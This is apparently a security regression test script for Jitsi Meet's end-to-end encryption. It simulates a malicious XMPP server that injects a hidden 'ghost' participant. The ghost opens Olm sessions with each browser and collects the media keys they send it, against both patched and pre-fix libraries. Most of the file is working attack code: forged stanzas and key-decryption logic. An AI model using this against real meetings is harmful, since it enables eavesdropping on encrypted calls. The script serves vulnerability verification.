// Can a malicious server get the media keys by adding a participant nobody sees?
//
// "Mallory" sits on each browser's XMPP WebSocket, as whoever runs Prosody can.
// Once Alice and Bob are in the meeting she announces a participant, "ghost",
// whose JID is on the deployment's hidden domain (the domain recorders and
// transcribers use). The app does not show hidden participants. Mallory then
// opens an Olm session from the ghost to each browser, signed with her own
// identity key, and reads every media key the browsers send the ghost.
//
//   node hidden-recipient.mjs [--url <meeting URL without jwt>] \
//       [--client current|old --lib <dir>] [--no-ghost] [--visible] [--app <app.bundle.min.js>]
//
// --client current  the library the meeting serves (the build under test)
// --client old --lib <dir>
//                    a rebuilt pre-fix library, to show the ghost collecting keys
// --no-ghost         control run: same meeting without the ghost
// --visible          no hidden domain: the ghost is an ordinary, listed participant
// --app <file>       serve this app bundle, and check what the app shows: the key
//                    recipients, the unknown-recipient warning, and that a request
//                    for transcription is refused while E2EE is on
//
// The sandbox has no hidden domain configured, so the test sets
// config.hiddenDomain in the meeting page, as a deployment with recording or
// transcription enabled does.

import fs from 'node:fs';
import path from 'node:path';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';
import { chromium } from 'playwright-core';
import { createDecryptor, fingerprint } from '../../extension/inspector/frame-crypto.js';
import { joinMeeting, leaveMeeting, meetingTarget, waitInPage } from '../harness/meeting.mjs';

const HERE = path.dirname(fileURLToPath(import.meta.url));

// The published extension's Inspector, with its key-recipient check.
const INSPECTOR = path.join(HERE, '../../extension/inspector');
const require = createRequire(import.meta.url);
const Olm = require('@matrix-org/olm/olm.js');
const argv = process.argv.slice(2);
const headed = argv.includes('--headed');
const slowMo = argv.includes('--slowmo') ? Number(argv[argv.indexOf('--slowmo') + 1]) : 0;
const client = argv.includes('--client') ? argv[argv.indexOf('--client') + 1] : 'current';
const libDir = argv.includes('--lib') ? argv[argv.indexOf('--lib') + 1] : null;
const noGhost = argv.includes('--no-ghost');
const visible = argv.includes('--visible');
const appBundle = argv.includes('--app') ? argv[argv.indexOf('--app') + 1] : null;
const sleep = ms => new Promise(r => setTimeout(r, ms));
const log = m => console.log(`[${new Date().toISOString().slice(11, 19)}] ${m}`);

if (![ 'current', 'old' ].includes(client) || (client === 'old' && !libDir)) {
    console.error('usage: node hidden-recipient.mjs [--url <meeting URL without jwt>] '
        + '[--client current|old --lib <dir>] [--no-ghost] [--visible] [--app <app.bundle.min.js>]');
    process.exit(2);
}
setTimeout(() => {
    console.error('run exceeded 3 minutes, aborting');
    process.exit(1);
}, 180000).unref();

const HIDDEN_DOMAIN = 'hidden.meet.jitsi';

// Lower than any real endpoint ID, so the browsers wait for the ghost to open the session.
const GHOST = '00000000';

await Olm.init();
const target = meetingTarget(argv, 'hidden');
const account = new Olm.Account();

account.create();
const { curve25519: ghostCurve, ed25519: ghostEd } = JSON.parse(account.identity_keys());

const unescapeXml = s => s.replace(/&(quot|apos|lt|gt|amp);/g,
    (_, e) => ({ quot: '"', apos: '\'', lt: '<', gt: '>', amp: '&' })[e]);
const escapeXml = s => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
const nickOf = (stanza, attr) => stanza.match(new RegExp(`\\s${attr}=['"][^'"]*/([^'"/]+)['"]`))?.[1];

const stolen = [];
const log2 = [];

// ---- Meeting -----------------------------------------------------------------

// current: use whatever the meeting serves (the build under test, which has the
// fix). old --lib <dir>: serve a rebuilt pre-fix library, to show the ghost
// collecting keys against vulnerable code.
const libFiles = {
    ...client === 'old' ? {
        'lib-jitsi-meet.min.js': fs.readFileSync(path.join(libDir, 'lib-jitsi-meet.min.js'), 'utf8'),
        'lib-jitsi-meet.e2ee-worker.js': fs.readFileSync(path.join(libDir, 'lib-jitsi-meet.e2ee-worker.js'), 'utf8')
    } : {},
    ...appBundle ? { 'app.bundle.min.js': fs.readFileSync(appBundle, 'utf8') } : {}
};
const browser = await chromium.launch({ channel: 'chrome', headless: !headed, slowMo, args: [
    '--use-fake-ui-for-media-stream',
    '--use-fake-device-for-media-stream',
    `--use-file-for-fake-audio-capture=${path.join(HERE, '../harness/media/tone440.wav')}`,
    '--autoplay-policy=no-user-gesture-required'
] });

async function join(name) {
    const ctx = await browser.newContext({ ignoreHTTPSErrors: true });
    const page = await ctx.newPage();
    const peer = { name, ws: null, jid: null, room: null, template: null, session: null, errors: [], injected: 0 };

    page.on('pageerror', e => log(`${name} page error: ${(e.stack ?? e.message).slice(0, 600)}`));
    page.on('console', m => /hidden participant|session-init from|Refusing/.test(m.text())
        && log(`${name} console: ${m.text().slice(0, 160)}`));
    for (const [ file, body ] of Object.entries(libFiles)) {
        await page.route(new RegExp(`/libs/${file.replace(/\./g, '\\.')}`),
            r => r.fulfill({ body, contentType: 'text/javascript' }));
    }
    // The meeting page includes config.js inline (server-side include): add the
    // hidden domain to the config object as the page creates it.
    visible || await page.addInitScript(domain => {
        let value;

        Object.defineProperty(window, 'config', {
            get: () => value,
            set: v => {
                value = v;
                value.hiddenDomain = domain;
            }
        });
    }, HIDDEN_DOMAIN);
    await page.routeWebSocket(/xmpp-websocket/, ws => {
        const server = ws.connectToServer();

        peer.ws = ws;
        ws.onMessage(m => {
            const s = String(m);


            // Messages for the ghost never reach the server: Mallory answers them.
            if (peer.room && (s.includes(`${peer.room}/${GHOST}'`) || s.includes(`${peer.room}/${GHOST}"`))) {
                fromBrowserToGhost(peer, s);

                return;
            }

            // Stream management (XEP-0198): the browser acknowledges every stanza it
            // received, including Mallory's. A malicious server keeps its own count;
            // here the real server must not see Mallory's stanzas counted.
            server.send(s.replace(/^(<(?:a|resume)\b[^>]*\sh=['"])(\d+)/, (_, head, h) => head + (Number(h) - peer.injected)));
        });
        server.onMessage(m => {
            if (typeof m === 'string') {
                peer.jid ??= m.match(/^<(?:presence|message|iq)[^>]*\sto=['"]([^'"]+\/[^'"]+)['"]/)?.[1];

                // A real participant's presence, used as the ghost's template.
                const from = nickOf(m, 'from');

                if (m.startsWith('<presence') && from && !m.includes('type=')
                        && /jitsi_participant_e2ee\.idKey/.test(m)) {
                    peer.room ??= m.match(/\sfrom=['"]([^'"/]+)\//)?.[1];

                    // Not our own presence (status 110).
                    if (!/<status code=['"]110['"]/.test(m)) {
                        peer.template ??= m;
                    }
                }
            }
            ws.send(m);
        });
    });
    await page.addInitScript({ path: path.join(INSPECTOR, 'leak-scan.js') });
    await page.addInitScript({ path: path.join(INSPECTOR, 'hook.js') });
    const hash = {
        'config.p2p.enabled': false,
        'config.startWithAudioMuted': false,
        'config.startWithVideoMuted': false,
        'config.videoQuality.codecPreferenceOrder': [ 'VP8' ],
        'userInfo.displayName': name
    };

    await joinMeeting(page, target.url(hash), name);
    peer.page = page;

    return peer;
}

// The ghost's presence: a copy of a real participant's, from the ghost's
// nickname, with a JID on the hidden domain and Mallory's identity keys. The
// copied occupant ID and capabilities go, so the browsers don't take the ghost
// for that participant or query it.
function ghostPresence(peer) {
    const from = nickOf(peer.template, 'from');

    return peer.template
        .replace(new RegExp(`(\\sfrom=['"][^'"/]+/)${from}(['"])`), `$1${GHOST}$2`)
        .replace(/(<item\b[^>]*?)\sjid=['"][^'"]*['"]/, '$1')
        .replace(/<item\b/, `<item jid='ghost@${HIDDEN_DOMAIN}/ghost'`)
        .replace(/(<jitsi_participant_e2ee\.idKey\.curve25519>)[^<]*/, (_, t) => t + ghostCurve)
        .replace(/(<jitsi_participant_e2ee\.idKey\.ed25519>)[^<]*/, (_, t) => t + ghostEd)
        .replace(/<nick\b[^>]*>[^<]*<\/nick>/, '')
        .replace(/<c\b[^>]*\/>/, '')
        .replace(/<occupant-id\b[^>]*\/>/, '')
        .replace(/(<stats-id>)[^<]*/, '$1ghost');
}

// Delivers a stanza from Mallory to a browser, counting it for stream management.
function toBrowser(peer, stanza) {
    peer.injected++;
    peer.ws.send(stanza);
}

function ghostMessage(peer, olm) {
    const payload = escapeXml(JSON.stringify({ type: 'olm', olm }));

    return `<message xmlns='jabber:client' from='${peer.room}/${GHOST}' to='${peer.jid}' type='chat'>`
        + `<json-message xmlns='http://jitsi.org/jitmeet'>${payload}</json-message></message>`;
}

function steal(peer, plaintext) {
    const info = JSON.parse(plaintext);

    if (info.key) {
        stolen.push({ t: 0, participantId: peer.id, keyIndex: info.keyIndex,
            key: [ ...Buffer.from(info.key, 'base64') ] });
        log2.push(`ghost read media key #${info.keyIndex} of ${peer.name}`);
    }
}

function fromBrowserToGhost(peer, stanza) {
    // A query to the ghost (e.g. service discovery) gets the error an absent client gives.
    if (stanza.startsWith('<iq') && /\stype=['"](get|set)['"]/.test(stanza)) {
        const id = stanza.match(/\sid=['"]([^'"]+)['"]/)?.[1];

        toBrowser(peer, `<iq xmlns='jabber:client' type='error' id='${id}' from='${peer.room}/${GHOST}' to='${peer.jid}'>`
            + '<error type=\'cancel\'><service-unavailable xmlns=\'urn:ietf:params:xml:ns:xmpp-stanzas\'/></error></iq>');

        return;
    }
    const m = stanza.match(/<json-message[^>]*>([^<]*)<\/json-message>/);

    if (!m) {
        return;
    }
    const msg = JSON.parse(unescapeXml(m[1])).olm;

    if (!msg) {
        return;
    }
    log2.push(`${peer.name} sent ${msg.type} to the ghost${msg.type === 'error' ? `: ${msg.data?.error}` : ''}`);
    try {
        if (msg.type === 'error') {
            peer.errors.push(msg.data?.error);
        } else if (msg.type === 'session-ack') {
            const session = new Olm.Session();

            session.create_inbound(account, msg.data.ciphertext.body);
            account.remove_one_time_keys(session);
            peer.session = session;
            steal(peer, session.decrypt(msg.data.ciphertext.type, msg.data.ciphertext.body));
        } else if (msg.data?.ciphertext && peer.session) {
            steal(peer, peer.session.decrypt(msg.data.ciphertext.type, msg.data.ciphertext.body));
            if (msg.type === 'key-info') {
                // A well-formed acknowledgement that carries no key of the ghost's own.
                toBrowser(peer, ghostMessage(peer, { type: 'key-info-ack',
                    data: { ciphertext: peer.session.encrypt('{}'), uuid: msg.data.uuid } }));
            }
        }
    } catch (e) {
        log2.push(`ghost failed on ${msg.type} from ${peer.name}: ${e.message}`);
    }
}

log(`client: ${client} lib-jitsi-meet, room ${target.room}`);
const alice = await join('alice');
const bob = await join('bob');

for (const p of [ alice, bob ]) {
    p.id = await p.page.evaluate(() => APP.conference._room.myUserId());
}
await sleep(3000);
for (const p of noGhost ? [] : [ alice, bob ]) {
    if (!p.template || !p.jid || !p.room) {
        throw new Error(`no presence template for ${p.name}`);
    }
    toBrowser(p, ghostPresence(p));
}
await sleep(2000);

const seen = p => p.page.evaluate(ghost => {
    const lib = APP.conference._room.getParticipantById(ghost);

    return {
        inLibrary: Boolean(lib),
        hidden: lib?.isHidden() ?? null,
        e2eeFeature: lib?.hasFeature('https://jitsi.org/meet/e2ee') ?? null,
        inParticipantList: APP.store.getState()['features/base/participants'].remote.has(ghost)
    };
}, GHOST);

const ghostSeen = { alice: await seen(alice), bob: await seen(bob) };
const hiddenDomainSeen = await alice.page.evaluate(() => config.hiddenDomain ?? null);

log(`config.hiddenDomain in the page: ${hiddenDomainSeen}`);

log(`ghost as seen by alice: ${JSON.stringify(ghostSeen.alice)}`);

await alice.page.evaluate(() => APP.store.dispatch({ type: 'TOGGLE_E2EE', enabled: true }));

// The ghost opens its Olm session with each browser as soon as E2EE starts.
for (const p of noGhost ? [] : [ alice, bob ]) {
    account.generate_one_time_keys(1);
    const otKey = Object.values(JSON.parse(account.one_time_keys()).curve25519)[0];

    account.mark_keys_as_published();
    toBrowser(p, ghostMessage(p, {
        type: 'session-init',
        data: {
            idKey: ghostCurve,
            otKey,
            signature: account.sign(JSON.stringify({ idKey: ghostCurve, otKey })),
            uuid: crypto.randomUUID()
        }
    }));
}
for (const p of [ alice, bob ]) {
    await waitInPage(p.page, () => APP.conference._room.isE2EEEnabled(), null, 30000);
}
log('E2EE on in both browsers; media for 15 s');
await sleep(15000);

// What the ghost can decrypt of the media each browser receives.
async function received(p) {
    const meta = await p.page.evaluate(() => window.__e2eeInspector.exportMeta());
    const ownKeys = createDecryptor(meta.keys);
    const ghostKeys = createDecryptor(stolen);
    const result = { frames: 0, byReceiver: 0, byGhost: 0 };

    process.env.VERBOSE && log(`${p.name} streams: ${JSON.stringify(meta.streams.map(st =>
        ({ mode: st.mode, frames: st.frameCount, kind: st.kind })))}`);

    for (const s of meta.streams.filter(st => st.mode === 'e2ee')) {
        const from = Math.max(0, s.frameCount - 300);
        const frames = (await p.page.evaluate(([ id, a, b ]) => window.__e2eeInspector.exportFrames(id, a, b),
            [ s.id, from, s.frameCount ])).map(f => ({ ...f, data: new Uint8Array(Buffer.from(f.data, 'base64')) }));

        for (const f of frames) {
            result.frames++;
            result.byReceiver += (await ownKeys(s, f)) ? 1 : 0;
            result.byGhost += (await ghostKeys(s, f)) ? 1 : 0;
        }
    }

    return result;
}
const media = { alice: await received(alice), bob: await received(bob) };
const recipients = p => p.page.evaluate(() => APP.store.getState()['features/e2ee']?.keyRecipients ?? null);
const keyRecipients = { alice: await recipients(alice), bob: await recipients(bob) };

// What the app shows, and whether it refuses transcription while E2EE is on.
const appView = p => p.page.evaluate(() => {
    const notifications = () => APP.store.getState()['features/notifications'].notifications
        .map(n => n.props.titleKey ?? n.props.descriptionKey);

    APP.store.dispatch({ type: 'SET_REQUESTING_SUBTITLES', enabled: true, displaySubtitles: true, language: null });

    return {
        unknownRecipientLabel: document.body.innerText.includes('Unknown key recipient'),
        notifications: notifications().filter(k => /^e2ee\./.test(k ?? '')),
        transcriptionRequested: APP.store.getState()['features/subtitles']._requestingSubtitles
    };
});
const app = appBundle ? { alice: await appView(alice), bob: await appView(bob) } : null;
const inspectorCheck = p => p.page.evaluate(() => window.__e2eeInspector.recipientCheck());
const inspector = { alice: await inspectorCheck(alice), bob: await inspectorCheck(bob) };

await Promise.all([ alice, bob ].map(p => leaveMeeting(p.page)));
await browser.close();

const report = {
    client,
    ghost: noGhost ? 'none' : visible ? 'visible' : 'hidden',
    hiddenDomain: HIDDEN_DOMAIN,
    ids: { alice: alice.id, bob: bob.id, ghost: GHOST },
    ghostSeen,
    events: [ ...new Set(log2) ],
    errorsToGhost: { alice: alice.errors, bob: bob.errors },
    keysStolen: await Promise.all(stolen.map(async k =>
        ({ participant: k.participantId, keyIndex: k.keyIndex, fingerprint: await fingerprint(Uint8Array.from(k.key)) }))),
    media,
    keyRecipients,
    app,
    inspector
};
const variant = `${noGhost ? '-no-ghost' : ''}${visible ? '-visible' : ''}${appBundle ? '-app' : ''}`;
const file = path.join(HERE, 'results', `hidden-recipient-${client}${variant}-${Date.now()}.json`);

fs.mkdirSync(path.dirname(file), { recursive: true });
fs.writeFileSync(file, JSON.stringify(report, null, 2));

console.log(`
Ghost (hidden ${ghostSeen.alice.hidden}, in participant list: alice ${ghostSeen.alice.inParticipantList}, bob ${
    ghostSeen.bob.inParticipantList})
Events:                 ${report.events.join('; ') || 'none'}
Media keys stolen:      ${stolen.length}
Meeting media works:    alice decrypts ${media.alice.byReceiver}/${media.alice.frames}, bob decrypts ${
    media.bob.byReceiver}/${media.bob.frames}
Ghost decrypts:         to alice ${media.alice.byGhost}/${media.alice.frames}, to bob ${media.bob.byGhost}/${media.bob.frames}
Key recipients (app):   alice ${JSON.stringify(keyRecipients.alice)}, bob ${JSON.stringify(keyRecipients.bob)}
Inspector:              ${[ alice, bob ].map(p => `${p.name} sent its key to ${
    inspector[p.name].recipients.map(r => r.participantId).join(', ') || 'nobody'}, not listed: ${
    inspector[p.name].notListed.join(', ') || 'none'}`).join('; ')}
App view:               ${app ? `alice ${JSON.stringify(app.alice)}, bob ${JSON.stringify(app.bob)}` : 'not checked'}
report: ${file}`);
